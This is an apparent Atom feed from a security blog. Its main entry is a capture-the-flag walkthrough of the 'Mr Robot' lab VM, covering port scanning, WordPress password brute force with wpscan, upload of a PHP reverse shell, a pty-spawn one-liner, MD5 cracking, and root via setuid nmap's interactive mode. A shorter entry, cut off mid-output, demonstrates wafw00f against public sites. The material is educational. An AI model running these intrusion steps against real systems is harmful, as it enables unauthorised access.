<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-07-01T10:17:59-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Owning Mr Robot]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/01/owning-mr-robot/"/>
    <updated>2017-07-01T04:46:24-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/01/owning-mr-robot</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target was inspired by the Mr Robot series. The goal is to find 3 hidden flags.</p>

<!-- more -->


<p>I used Masscan to grab the open ports, which I then passed to Nmap:</p>

<p>```
masscan -p1-65535 &mdash;banners 192.168.217.145 &mdash;rate=10000</p>

<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-07-01 08:49:44 GMT
 &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 443/tcp on 192.168.217.145                              <br/>
Discovered open port 80/tcp on 192.168.217.145</p>

<p>nmap -T4 -p80,443 -A 192.168.217.145
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|<em>http-server-header: Apache
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
443/tcp open  ssl/http Apache httpd
|<em>http-server-header: Apache
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```</p>

<p>Just a web server. However, this doesn&rsquo;t look like your regular web app:</p>

<p><img class="center" src="/images/pentest/mr-robot/fsociety.png" title="&lsquo;fsociety&rsquo; &lsquo;fsociety login&rsquo;" ></p>

<p>Interesting, we are in contact with fsociety! I ran each command (type help to see them listed at any time), and here&rsquo;s what we have so far:</p>

<ul>
<li><p>prepare &ndash; a video that ends with an address that warrants checking: whoismrrobot.com</p></li>
<li><p>fsociety &ndash; a CLI animation that asks if you are ready to join</p></li>
<li><p>inform &ndash; a series of news that reveal the hypocrisy of today&rsquo;s (is it really made up?) society</p></li>
</ul>


<p><img class="center" src="/images/pentest/mr-robot/deflated.png" title="&lsquo;sports scandal&rsquo; &lsquo;sports scandal&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/space.png" title="&lsquo;space rocket&rsquo; &lsquo;space rocket&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/meast.png" title="&lsquo;middle east&rsquo; &lsquo;middle east&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/gala.png" title="&lsquo;gala&rsquo; &lsquo;celebrity gala&rsquo;" ></p>

<ul>
<li>question &ndash; more pictures with hard to accept truths</li>
</ul>


<p><img class="center" src="/images/pentest/mr-robot/america.png" title="&lsquo;patriot&rsquo; &lsquo;american dream&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/executive.png" title="&lsquo;executive&rsquo; &lsquo;executive stealing&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/capitalist.png" title="&lsquo;capitalism&rsquo; &lsquo;capitalism&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/bzns.png" title="&lsquo;business&rsquo; &lsquo;business&rsquo;" ></p>

<ul>
<li><p>wakeup &ndash; shows some high level executives arguing in a skyscraper</p></li>
<li><p>join &ndash; fsociety requests your mail address to keep in touch</p></li>
</ul>


<p><img class="center" src="/images/pentest/mr-robot/mail.png" title="&lsquo;enter your mail&rsquo; &lsquo;enter your mail&rsquo;" ></p>

<p>Alright, we had some fun. Now I checked that URL I mentioned earlier for more breadcrumbs:</p>

<p><img class="center" src="/images/pentest/mr-robot/whois.png" title="&lsquo;whois mr robot&rsquo; &lsquo;whois mr robot&rsquo;" ></p>

<p>You can click on the GUI, look around, play some games. There are also some commands you can run in the terminal:</p>

<ul>
<li><p>fsociety_endgame &ndash; launches a game that you might want to discover for yourself</p></li>
<li><p>massacre &ndash; launches a movie, but I got a message that content is not available to my location</p></li>
<li><p>elliot &ndash; shows a GIF</p></li>
<li><p>fivenine &ndash; looks like a collection of clips related to the Five-Nine attack</p></li>
<li><p>restart &ndash; another scene from the series</p></li>
<li><p>join &ndash; get in touch with Mr Robot</p></li>
<li><p>archive &ndash; shows some of the above commands</p></li>
</ul>


<h2>Flag #1</h2>

<p>When running the commands, you probably noticed that the web path changes to <code>URL/cmdname</code>. I looked for robots.txt, and it looks like Mr Robot isn&rsquo;t the only robot around:</p>

<p><code>
User-agent: *
fsocity.dic
key-1-of-3.txt
</code></p>

<p>We&rsquo;ve found the first flag: <code>073403c8a58a1f80d943455fb30724b9</code></p>

<p>The other things looks like a dictionary file with various strings. Maybe it will come in handy later.</p>

<p>Continuing the web recon, I decided to use a tool that I haven&rsquo;t used before: uniscan!</p>

<h3>uniscan description</h3>

<p>Homepage: <a href="https://sourceforge.net/projects/uniscan/">https://sourceforge.net/projects/uniscan/</a></p>

<blockquote><p>Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p></blockquote>

<p>This tool comes in both CLI and GUI form. The GUI interface is plain and simple:</p>

<p><img class="center" src="/images/pentest/mr-robot/uniscan-gui.png" title="&lsquo;uniscan-gui&rsquo; &lsquo;uniscan gui&rsquo;" ></p>

<h3>uniscan options</h3>

<p>```</p>

<h6>#</h6>

<h1>Uniscan project</h1>

<h1><a href="http://uniscan.sourceforge.net/">http://uniscan.sourceforge.net/</a></h1>

<h6>#</h6>

<ol type="a">
<li>6.3</li>
</ol>


<p>OPTIONS:</p>

<pre><code>-h  help
-u  &lt;url&gt; example: https://www.example.com/
-f  &lt;file&gt; list of url's
-b  Uniscan go to background
-q  Enable Directory checks
-w  Enable File checks
-e  Enable robots.txt and sitemap.xml check
-d  Enable Dynamic checks
-s  Enable Static checks
-r  Enable Stress checks
-i  &lt;dork&gt; Bing search
-o  &lt;dork&gt; Google search
-g  Web fingerprint
-j  Server fingerprint
</code></pre>

<p>usage:
[1] perl ./uniscan.pl -u <a href="http://www.example.com/">http://www.example.com/</a> -qweds
[2] perl ./uniscan.pl -f sites.txt -bqweds
[3] perl ./uniscan.pl -i uniscan
[4] perl ./uniscan.pl -i &ldquo;ip:xxx.xxx.xxx.xxx&rdquo;
[5] perl ./uniscan.pl -o &ldquo;inurl:test&rdquo;
[6] perl ./uniscan.pl -u <a href="https://www.example.com/">https://www.example.com/</a> -r
```</p>

<p>I ran the CLI tool against the target with most of the flags. While described as simple, it checks for plenty of things: Drupal plugins, mobile versions, error message information, interesting HTML strings, performs whois and nslookup lookups, attempts banner grabbing, runs ping, traceroute and Nmap against the target, looks for some specific issues, and more:</p>

<p>```
Crawler Started:
| Plugin name: FCKeditor upload test v.1 Loaded.
| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
| Plugin name: Upload Form Detect v.1.1 Loaded.
| Plugin name: phpinfo() Disclosure v.1 Loaded.
| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
| Plugin name: Code Disclosure v.1.1 Loaded.
| Plugin name: E-mail Detection v.1.1 Loaded.
| Plugin name: External Host Detect v.1.2 Loaded.
| [+] Crawling finished, 59 URL&rsquo;s found!</p>

<p>Dynamic tests:
| Plugin name: Learning New Directories v.1.2 Loaded.
| Plugin name: FCKedior tests v.1.1 Loaded.
| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
| Plugin name: Find Backup Files v.1.2 Loaded.
| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.2 Loaded.
| Plugin name: SQL-injection tests v.1.2 Loaded.
| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
| Plugin name: Web Shell Finder v.1.3 Loaded.
```</p>

<p>And the tool did find some useful information for further compromising the target!</p>

<h1>``` </h1>

<p>|
| Directory check:
| [+] CODE: 200 URL: <a href="http://192.168.217.145/Image/">http://192.168.217.145/Image/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/">http://192.168.217.145/admin/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/feed/">http://192.168.217.145/feed/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/image/">http://192.168.217.145/image/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/login/">http://192.168.217.145/login/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/rss/">http://192.168.217.145/rss/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/wp-login/">http://192.168.217.145/wp-login/</a></p>

<h1>| [+] CODE: 200 URL: <a href="http://192.168.217.145/wp-admin/">http://192.168.217.145/wp-admin/</a></h1>

<p>|                                                                                                 <br/>
| File check:
| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/index.html">http://192.168.217.145/admin/index.html</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/index.php">http://192.168.217.145/admin/index.php</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/favicon.ico">http://192.168.217.145/favicon.ico</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.html">http://192.168.217.145/index.html</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.html%20">http://192.168.217.145/index.html%20</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.php">http://192.168.217.145/index.php</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/license.txt">http://192.168.217.145/license.txt</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/readme.html">http://192.168.217.145/readme.html</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/readme">http://192.168.217.145/readme</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/robots.txt">http://192.168.217.145/robots.txt</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/htx/sqlqhit.asp">http://192.168.217.145/search/htx/sqlqhit.asp</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/htx/SQLQHit.asp">http://192.168.217.145/search/htx/SQLQHit.asp</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/sqlqhit.asp">http://192.168.217.145/search/sqlqhit.asp</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/SQLQHit.asp">http://192.168.217.145/search/SQLQHit.asp</a></p>

<h1>| [+] CODE: 200 URL: <a href="http://192.168.217.145/sitemap.xml">http://192.168.217.145/sitemap.xml</a></h1>

<p>```</p>

<p>What do you know, a Wordpress instance is running on the server! So it&rsquo;s time for wpscan!</p>

<h3>wpscan description</h3>

<p>Homepage: <a href="https://wpscan.org/">https://wpscan.org/</a></p>

<blockquote><p>WPScan is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>

<h3>wpscan options</h3>

<p>```
wpscan &mdash;help</p>

<hr />

<pre><code>    __          _______   _____                  
    \ \        / /  __ \ / ____|                 
     \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
      \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
       \  /\  /  | |     ____) | (__| (_| | | | |
        \/  \/   |_|    |_____/ \___|\__,_|_| |_|

    WordPress Security Scanner by the WPScan Team 
                   Version 2.9.2
      Sponsored by Sucuri - https://sucuri.net
</code></pre>

<p>   @<em>WPScan</em>, @ethicalhack3r, @erwan_lr, pvdl, @<em>FireFart</em></p>

<hr />

<p>Help :</p>

<p>Some values are settable in a config file, see the example.conf.json</p>

<p>&mdash;update                            Update the database to the latest version.
&mdash;url       | -u <target url>       The WordPress URL/domain to scan.
&mdash;force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
&mdash;enumerate | -e [option(s)]        Enumeration.
  option :</p>

<pre><code>u        usernames from id 1 to 10
u[10-20] usernames from id 10 to 20 (you must write [] chars)
p        plugins
vp       only vulnerable plugins
ap       all plugins (can take a long time)
tt       timthumbs
t        themes
vt       only vulnerable themes
at       all themes (can take a long time)
</code></pre>

<p>  Multiple values are allowed : &ldquo;-e tt,p&rdquo; will enumerate timthumbs and plugins
  If no option is supplied, the default is &ldquo;vt,tt,u,vp&rdquo;</p>

<p>&mdash;exclude-content-based &ldquo;<regexp or string>&rdquo;</p>

<pre><code>                                Used with the enumeration option, will exclude all occurrences based on the regexp or string supplied.
                                You do not need to provide the regexp delimiters, but you must write the quotes (simple or double).
</code></pre>

<p>&mdash;config-file  | -c <config file>   Use the specified config file, see the example.conf.json.
&mdash;user-agent   | -a &lt;User-Agent>    Use the specified User-Agent.
&mdash;cookie <string>                   String to read cookies from.
&mdash;random-agent | -r                 Use a random User-Agent.
&mdash;follow-redirection                If the target url has a redirection, it will be followed without asking if you wanted to do so or not
&mdash;batch                             Never ask for user input, use the default behaviour.
&mdash;no-color                          Do not use colors in the output.
&mdash;log                               Creates a log.txt file with WPScan&rsquo;s output.
&mdash;no-banner                         Prevents the WPScan banner from being displayed.
&mdash;disable-accept-header             Prevents WPScan sending the Accept HTTP header.
&mdash;disable-referer                   Prevents setting the Referer header.
&mdash;disable-tls-checks                Disables SSL/TLS certificate verification.
&mdash;wp-content-dir <wp content dir>   WPScan try to find the content directory (ie wp-content) by scanning the index page, however you can specify it.</p>

<pre><code>                                Subdirectories are allowed.
</code></pre>

<p>&mdash;wp-plugins-dir <wp plugins dir>   Same thing than &mdash;wp-content-dir but for the plugins directory.</p>

<pre><code>                                If not supplied, WPScan will use wp-content-dir/plugins. Subdirectories are allowed
</code></pre>

<p>&mdash;proxy &lt;[protocol://]host:port>    Supply a proxy. HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported.</p>

<pre><code>                                If no protocol is given (format host:port), HTTP will be used.
</code></pre>

<p>&mdash;proxy-auth &lt;username:password>    Supply the proxy login credentials.
&mdash;basic-auth &lt;username:password>    Set the HTTP Basic authentication.
&mdash;wordlist | -w <wordlist>          Supply a wordlist for the password brute forcer.
&mdash;username | -U <username>          Only brute force the supplied username.
&mdash;usernames     &lt;path-to-file>      Only brute force the usernames from the file.
&mdash;cache-dir       &lt;cache-directory> Set the cache directory.
&mdash;cache-ttl       &lt;cache-ttl>       Typhoeus cache TTL.
&mdash;request-timeout &lt;request-timeout> Request Timeout.
&mdash;connect-timeout &lt;connect-timeout> Connect Timeout.
&mdash;threads  | -t <number of threads> The number of threads to use when multi-threading requests.
&mdash;max-threads     &lt;max-threads>     Maximum Threads.
&mdash;throttle        <milliseconds>    Milliseconds to wait before doing another web request. If used, the &mdash;threads should be set to 1.
&mdash;help     | -h                     This help screen.
&mdash;verbose  | -v                     Verbose output.
&mdash;version                           Output the current version and exit.</p>

<p>Examples :</p>

<p>-Further help &hellip;
ruby ./wpscan.rb &mdash;help</p>

<p>-Do &lsquo;non-intrusive&rsquo; checks &hellip;
ruby ./wpscan.rb &mdash;url www.example.com</p>

<p>-Do wordlist password brute force on enumerated users using 50 threads &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;wordlist darkc0de.lst &mdash;threads 50</p>

<p>-Do wordlist password brute force on the &lsquo;admin&rsquo; username only &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;wordlist darkc0de.lst &mdash;username admin</p>

<p>-Enumerate installed plugins &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate p</p>

<p>-Enumerate installed themes &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate t</p>

<p>-Enumerate users &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate u</p>

<p>-Enumerate installed timthumbs &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate tt</p>

<p>-Use a HTTP proxy &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;proxy 127.0.0.1:8118</p>

<p>-Use a SOCKS5 proxy &hellip; (cURL >= v7.21.7 needed)
ruby ./wpscan.rb &mdash;url www.example.com &mdash;proxy socks5://127.0.0.1:9000</p>

<p>-Use custom content directory &hellip;
ruby ./wpscan.rb -u www.example.com &mdash;wp-content-dir custom-content</p>

<p>-Use custom plugins directory &hellip;
ruby ./wpscan.rb -u www.example.com &mdash;wp-plugins-dir wp-content/custom-plugins</p>

<p>-Update the DB &hellip;
ruby ./wpscan.rb &mdash;update</p>

<p>-Debug output &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;debug-output 2>debug.log</p>

<p>See README for further information.
```</p>

<p>First, I updated the wpscan databse with <code>wpscan &mdash;update</code>. Then I performed some enumeration on the target:</p>

<p>```
wpscan &mdash;url <a href="http://192.168.217.145">http://192.168.217.145</a> &mdash;enumerate u vp vt &mdash;no-banner
[+] URL: <a href="http://192.168.217.145/">http://192.168.217.145/</a>
[+] Started: Sat Jul  1 07:40:05 2017</p>

<p>[+] robots.txt available under: &lsquo;<a href="http://192.168.217.145/robots.txt">http://192.168.217.145/robots.txt</a>&rsquo;
[!] The WordPress &lsquo;<a href="http://192.168.217.145/readme.html">http://192.168.217.145/readme.html</a>&rsquo; file exists exposing a version number
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: <a href="http://192.168.217.145/xmlrpc.php">http://192.168.217.145/xmlrpc.php</a></p>

<p>[+] WordPress version 4.3.11 (Released on 2017-05-16) identified from rss generator, rdf generator, atom generator, links opml
[!] 1 vulnerability identified from the version number</p>

<p>[!] Title: WordPress 2.3-4.7.5 &ndash; Host Header Injection in Password Reset</p>

<pre><code>Reference: https://wpvulndb.com/vulnerabilities/8807
Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
</code></pre>

<p>[+] Enumerating plugins from passive detection &hellip;
[+] No plugins found</p>

<p>[+] Enumerating usernames &hellip;
[+] We did not enumerate any usernames</p>

<p>[+] Finished: Sat Jul  1 07:40:07 2017
[+] Requests Done: 57
[+] Memory used: 17.109 MB
[+] Elapsed time: 00:00:02
```</p>

<p>I couldn&rsquo;t use wpscan&rsquo;s findings for exploitation. Based on our earlier finding of a dictionary file, the next step seems to involve bruteforcing. I went back to the file and looked at its size:</p>

<p><code>
wc -l fsocity.dic
858160 fsocity.dic
</code></p>

<p>Not a small one, but maybe it contains duplicates:</p>

<p><code>
sort fsocity.dic | uniq | wc -l
11451
</code></p>

<p>A little over 11k, much more promising! I created a new file without the duplicates: <code>sort fsocity.dic | uniq > fsociety.txt</code>.</p>

<p>The next step was to visit <a href="http://192.168.217.145/wp-login.php">http://192.168.217.145/wp-login.php</a> and try to gather more information. Bogus login attempts triggered the message: ERROR: Invalid username. Next, I looked in the source to see how form parameters look like:</p>

<p><img class="center" src="/images/pentest/mr-robot/wplogin.png" title="&lsquo;wplogin&rsquo; &lsquo;wplogin&rsquo;" ></p>

<p>It seemed I would have to bruteforce for both username and password, but I tried a few character names from the series first, and that&rsquo;s how I found that elliot is a valid user. With this, I used wpscan to perform the bruteforce attack for the password:</p>

<p>```
wpscan &mdash;url <a href="http://192.168.217.145/">http://192.168.217.145/</a> &mdash;wordlist ~/Downloads/fsociety.txt &mdash;username elliot
[&hellip;]
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : elliot Password : ER28-0652</p>

<p>  Brute Forcing &lsquo;elliot&rsquo; Time: 00:02:27 &lt;==================================                                    > (5640 / 11452) 49.24%  ETA: 00:02:32
  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  | Id | Login  | Name | Password  |
  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  |    | elliot |      | ER28-0652 |
  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>Excellent, wpscan found the password is <em>ER28-0652</em>! I logged in and noticed that all the plugins are outdated:</p>

<p><img class="center" src="/images/pentest/mr-robot/plugins.png" title="&lsquo;wp plugins&rsquo; &lsquo;wp plugins&rsquo;" ></p>

<p>I tried uploading a PHP reverse shell as plugin, but got an error that it couldn&rsquo;t install it. I looked in other places where I could upload it, and when browsing the Media tab, I noticed my shell was there :O</p>

<p><img class="center" src="/images/pentest/mr-robot/media.png" title="&lsquo;media library&rsquo; &lsquo;media library&rsquo;" ></p>

<p>Wasn&rsquo;t sure where it placed in, so I just tried adding shell.php to the URL, and Wordpress kindly gave me the correct path to it, which was <a href="http://192.168.217.145/wp-content/uploads/2017/07/shell.php">http://192.168.217.145/wp-content/uploads/2017/07/shell.php</a></p>

<h2>Flag #2</h2>

<p>Finally achieved presence on the machine:</p>

<p><code>
$ whoami
daemon
$ ls /home
robot
$ ls -la /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
</code></p>

<p>Found the second flag, but couldn&rsquo;t read it. However, that md5 file was readable:</p>

<p><code>
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
</code></p>

<p>I cracked the MD5 hash to reveal the password <em>abcdefghijklmnopqrstuvwxyz</em> for the user robot. I tried switching to that user, but I got the following error:</p>

<p><code>
$ su robot
su: must be run from a terminal
</code></p>

<p>The error appears because the shell isn&rsquo;t interactive. But I ran into this before, and again <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentestmonkey&rsquo;s oneliners</a> came to the rescue:</p>

<p>```
$ python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz</p>

<p>robot@linux:/$
```</p>

<p>I grabbed the second flag, and noticed that my commands are now echoed in the terminal and it&rsquo;s annoying:</p>

<p><code>
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
</code></p>

<h2>Flag #3</h2>

<p>I couldn&rsquo;t find a workaround for that, so I just continued. When I looked for SUID binaries, I found a surprise:</p>

<p><code>
robot@linux:/$ find / -type f \( -perm +4000 -o -perm +2000 \) -print 2&gt; /dev/null
[...]
/usr/local/bin/nmap
</code></p>

<p>After Googling, there even seems to be a <a href="https://www.rapid7.com/db/modules/exploit/unix/local/setuid_nmap">setuid Nmap exploit</a> in Metasploit! I read more about this problem, and found an interesting <a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">SANS paper</a> (the Nmap stuff begins on page 11). After some reading, I found that older versions of Nmap had an interactive mode, where you could run shell commands from or drop into a shell (similar to mysql):</p>

<p>```
robot@linux:/$ nmap &mdash;interactive
nmap &mdash;interactive</p>

<p>Starting nmap V. 3.81 ( <a href="http://www.insecure.org/nmap/">http://www.insecure.org/nmap/</a> )
Welcome to Interactive Mode &mdash; press h <enter> for help
nmap>
```</p>

<p>The Nmap version is 3.81, so I tried it out:</p>

<p><code>
nmap&gt; !whoami
!whoami
root
waiting to reap child : No child processes
</code></p>

<p>It did work! Game over, Mr Robot!</p>

<p>```
nmap> !sh
!sh</p>

<h1>ls /root</h1>

<p>ls /root
firstboot_done  key-3-of-3.txt</p>

<h1>cat /root/key-3-of-3.txt</h1>

<p>cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```</p>

<p>Another interesting challenge, more story driven. It reminded me of <a href="https://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/">Primer</a>.</p>

<p><strong>Learn more</strong></p>

<ul>
<li><p><a href="https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html">Using wpscan to find Wordpress vulnerabilities</a></p></li>
<li><p><a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">Attack and Defend: Linux Privilege Escalation Techniques of 2016</a></p></li>
</ul>


<p>```</p>

<hr />

<p>/ You have literary talent that you \
\ should take pains to develop.     /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[wafw00f - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/30/wafw00f-kali-linux-tools/"/>
    <updated>2017-06-30T04:46:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/30/wafw00f-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you need to establish if a web application firewall is in place, and ideally, what type of WAF it is. You can go bark at it with wafw00f!</p>

<p>Homepage: <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>

<!-- more -->


<h2>wafw00f description</h2>

<blockquote><p>WAFW00F identifies and fingerprints Web Application Firewall (WAF) products.</p>

<p>How does it work?</p>

<p>To do its magic, WAFW00F does the following:</p>

<p> Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions</p>

<p> If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to
deduce which WAF it is</p>

<p> If that is also not successful, it analyses the responses previously returned and uses another simple algorithm
to guess if a WAF or security solution is actively responding to our attacks</p></blockquote>

<h2>wafw00f options</h2>

<p>```
wafw00f -h</p>

<pre><code>                             ^     ^
    _   __  _   ____ _   __  _    _   ____
   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
  | V V // o // _/ | V V // 0 // 0 // _/
  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                            &lt;
                             ...'

WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci &amp;&amp; Wendel G. Henrique
</code></pre>

<p>Usage: wafw00f url1 [url2 [url3 &hellip; ]]
example: wafw00f <a href="http://www.victim.org/">http://www.victim.org/</a></p>

<p>Options:
  -h, &mdash;help            show this help message and exit
  -v, &mdash;verbose         enable verbosity &ndash; multiple -v options increase</p>

<pre><code>                    verbosity
</code></pre>

<p>  -a, &mdash;findall         Find all WAFs, do not stop testing on the first one
  -r, &mdash;disableredirect</p>

<pre><code>                    Do not follow redirections given by 3xx responses
</code></pre>

<p>  -t TEST, &mdash;test=TEST  Test for one specific WAF
  -l, &mdash;list            List all WAFs that we are able to detect
  &mdash;xmlrpc              Switch on the XML-RPC interface instead of CUI
  &mdash;xmlrpcport=XMLRPCPORT</p>

<pre><code>                    Specify an alternative port to listen on, default 8001
</code></pre>

<p>  -V, &mdash;version         Print out the version
```</p>

<h2>wafw00f usage</h2>

<ul>
<li>see what WAFs it can detect at the moment</li>
</ul>


<p>```
wafw00f -l</p>

<pre><code>                             ^     ^
    _   __  _   ____ _   __  _    _   ____
   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
  | V V // o // _/ | V V // 0 // 0 // _/
  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                            &lt;
                             ...'

WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci &amp;&amp; Wendel G. Henrique
</code></pre>

<p>Can test for these WAFs:</p>

<p>Profense
NetContinuum
Incapsula WAF
CloudFlare
USP Secure Entry Server
Cisco ACE XML Gateway
Barracuda Application Firewall
Art of Defence HyperGuard
BinarySec
Teros WAF
F5 BIG-IP LTM
F5 BIG-IP APM
F5 BIG-IP ASM
F5 FirePass
F5 Trafficshield
InfoGuard Airlock
Citrix NetScaler
Trustwave ModSecurity
IBM Web Application Security
IBM DataPower
DenyALL WAF
Applicure dotDefender
Juniper WebApp Secure
Microsoft URLScan
Aqtronix WebKnight
eEye Digital Security SecureIIS
Imperva SecureSphere
Microsoft ISA Server
```</p>

<ul>
<li>detect WAF</li>
</ul>


<p>```
wafw00f <a href="https://bugcrowd.com">https://bugcrowd.com</a></p>

<pre><code>                             ^     ^
    _   __  _   ____ _   __  _    _   ____
   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
  | V V // o // _/ | V V // 0 // 0 // _/
  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                            &lt;
                             ...'

WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci &amp;&amp; Wendel G. Henrique
</code></pre>

<p>Checking <a href="https://bugcrowd.com">https://bugcrowd.com</a>
The site <a href="https://bugcrowd.com">https://bugcrowd.com</a> is behind a CloudFlare
Number of requests: 1
```</p>

<ul>
<li>not detecting WAF</li>
</ul>


<p>```
wafw00f cisco.com</p>

<pre><code>                             ^     ^
    _   __  _   ____ _   __  _    _   ____
   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
  | V V // o // _/ | V V // 0 // 0 // _/
  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                            &lt;
                             ...'

WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci &amp;&amp; Wendel G. Henrique
</code></pre>

<p>Checking <a href="http://cisco.com">http://cisco.com</a>
